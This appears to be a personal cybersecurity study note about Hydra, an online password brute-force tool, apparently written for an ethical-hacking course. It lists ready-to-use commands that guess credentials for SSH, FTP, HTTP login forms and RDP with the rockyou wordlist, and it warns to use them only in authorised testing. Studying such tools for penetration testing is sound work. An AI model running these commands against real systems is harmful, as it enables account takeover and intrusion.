---
type: tool
subject: shared
tags: [cybersecurity, tool, hydra, brute-force, password-cracking]
status: learning
created: 2026-07-02
---

# Hydra

> 🔧 **Tool Note** — Category: Online Brute Force | Open Source

---

## 📌 Quick Overview
**What is it?** Fast online password brute force tool supporting 50+ protocols (SSH, HTTP, FTP, RDP, etc.)

**Used in:** EHPT

## Common Commands
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# FTP brute force
hydra -l admin -P rockyou.txt ftp://192.168.1.10

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# RDP brute force
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# Multiple users
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
```

> ⚠️ Online brute force is NOISY — easily detected by SOC/SIEM. Use only in authorised testing.

## 🔗 Related Notes
- [[Exploitation & Post-Exploitation|Exploitation]]
- [[John the Ripper & Hashcat]] — Offline cracking complement
